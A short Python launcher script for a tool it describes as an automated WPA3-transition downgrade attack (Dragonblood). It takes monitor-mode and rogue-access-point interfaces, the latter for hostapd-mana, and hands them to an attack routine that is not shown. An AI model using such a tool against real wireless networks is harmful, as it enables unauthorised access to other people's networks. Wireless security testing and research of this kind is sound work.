import argparse
from new_attack_flow import new_attack_flow

def main():
  parser = argparse.ArgumentParser(
    description="Automated WPA3-Transition Downgrade Attack Tool (Dragonblood)."
  )

  parser.add_argument(
    "-m", "--monitor",
    dest="monitor_interface",
    type=str,
    required=True,
    help="Interface to use in monitor mode."
  )

  parser.add_argument(
    "-r", "--rogue",
    dest="rogueAP_interface",
    type=str,
    required=True,
    help="Interface to use for Rogue AP during hostapd-mana launch."
  )

  args = parser.parse_args()

  monitor_interface = args.monitor_interface
  managed_interface = args.rogueAP_interface
  new_attack_flow(monitor_interface, managed_interface)

if __name__ == "__main__":
    main()
